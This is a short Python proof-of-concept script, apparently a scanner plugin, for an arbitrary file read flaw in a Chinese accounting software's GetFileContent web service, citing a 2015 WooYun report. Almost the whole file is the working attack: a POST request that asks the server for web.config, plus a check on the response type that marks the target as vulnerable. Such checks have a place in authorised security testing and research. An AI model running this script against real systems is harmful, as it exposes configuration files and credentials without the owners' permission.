﻿#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 安财软件GetFileContent任意文件读取
referer: http://www.wooyun.org/bugs/wooyun-2015-0121651
author: Lucifer
description: 文件/WS/WebService.asmx/GetFileContent中,参数fileName存在任意文件读取。
'''
import sys
import json
import requests
import warnings
def run(url):
    result=['','不存在']
    headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    post_data = {
        "Content":"1",
        "fileName":"web.config"
    }
    payload = "/WS/WebService.asmx/GetFileContent"
    vulnurl = url + payload
    try:
        req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
        if req.headers["Content-Type"] == "application/xml":
            result[0] = vulnurl+"\npost: "+json.dumps(post_data, indent=4)
            result[1] = '存在'
        else:
            result[1] = '不存在'

    except:
        result[1] = '不存在'
    return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])